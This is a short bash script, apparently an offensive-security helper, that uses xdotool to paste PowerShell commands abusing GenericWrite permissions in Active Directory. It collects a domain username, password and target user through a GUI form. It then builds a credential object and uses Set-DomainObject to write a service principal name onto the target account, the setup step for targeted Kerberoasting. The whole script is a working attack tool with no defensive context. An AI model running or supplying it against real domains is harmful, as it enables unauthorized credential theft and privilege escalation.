#!/bin/bash

: '
powershell: genericWrite permissions exploit
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Domain\Username" "Password" "Request user"

paste_command "\$SecPassword = ConvertTo-SecureString '${form_data["Password"]}' -AsPlainText -Force"
xdotool key Return
sleep 1.5

paste_command "\$Cred = New-Object System.Management.Automation.PSCredential('${form_data["Domain\Username"]}', \$SecPassword)"
xdotool key Return
sleep 1.5

paste_command "Set-DomainObject -credential \$Cred -Identity ${form_data["Request user"]} -SET @{serviceprincipalname='pentesting/LEGIT'} -Verbose"
xdotool key Return
sleep 1.5
